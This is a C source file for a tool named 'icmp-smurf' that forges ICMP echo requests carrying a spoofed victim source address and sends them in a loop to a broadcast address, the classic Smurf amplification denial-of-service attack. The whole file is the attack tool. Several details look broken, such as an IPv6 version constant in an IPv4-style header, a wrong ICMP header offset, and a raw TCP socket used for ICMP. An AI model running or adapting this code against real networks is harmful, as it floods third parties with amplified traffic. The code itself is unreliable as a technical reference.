#include "ip-headers.h"
#include "ip-constructors.c"
#include "applications.c"
#include "constants.h"

//http://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml
// Arguments standarized and checked //
// Respects executable [--source-addr saddr --[remote|broadcast]-addr raddr --source-port sport [--remote-port rport] [--n N]] //
int main(int argc,char* argv[]){
    if(argc!=9){fprintf(stdout,"Usage: icmp-smurf --source-addr saddr --broadcast-addr baddr --source-port sport --n N\n"); exit(0);}
	else{	
		/** Example source address and source port **/
		char* source_address    = argv[2];
		char* source_port       = argv[6];
		char* broadcast_address = argv[4];
		int iterations          = atoi(argv[8]);

		/** Obtain the socket**/
		int sock = get_socket_descriptor_raw_tcp();
		/** Create buffer for your packets **/
		char buffer[DEFAULT_PCKT_LEN]; memset(buffer,0,DEFAULT_PCKT_LEN);
	
		/**Init sockaddr_in with my network information (Only if it's necessary, there are functions in applications that spoofs your addr)**/
		struct sockaddr_in myaddr;
		set_sockaddr_in(&myaddr,source_address,source_port);

		/** Create your headers and make your combinations **/
		IP_HEADER *ip_hdr   = (IP_HEADER *)buffer;
		ICMP_HEADER *icmp_hdr = (ICMP_HEADER *)(buffer + sizeof(ICMP_HEADER));

		/** Fill your headers (IP && TCP in this case) **/
		set_ip_header(ip_hdr,IP_VERSION_V6,IP_DEFAULT_IHL,IP_CURRENT_TOS,IP_DEFAULT_IDENTIFICATION,0,0,0,\
			      IP_DEFAULT_FRAGMENT_OFFSET,IP_DEFAULT_TTL,IP_ICMP_PROTOCOL,0,source_address,broadcast_address,0);

		/** Use auxiliar functions to warn of current status **/
		SHOW_CREATED_IP_HEADER(ip_hdr);
		
		set_icmp_header(icmp_hdr,ICMP_ECHO,0,0,0);
		SHOW_CREATED_ICMP_HEADER(icmp_hdr);

		/** Notice the kernel that we doesn't need it fill the header **/
		if(kernel_not_fill_my_header(sock)<0){fprintf(stderr,"Is not possible to notice the kernel"); exit(0);}
		
		/** Application (Send icmp requests to broadcast addr with victim ip spoofed) **/
		int count = 0,i;
		#pragma omp parallel for reduction(+:count) if(iterations>=2000000)
		for(i=0;i<iterations;i++){
			if(sendto(sock, buffer, ip_hdr->total_length, 0, (struct sockaddr*)&myaddr, sizeof(myaddr))>=0) count++;
		}
		fprintf(stdout,"Send %d icmp echo to broadcast %s\n",count,broadcast_address);
	
	}
	return 0;
}
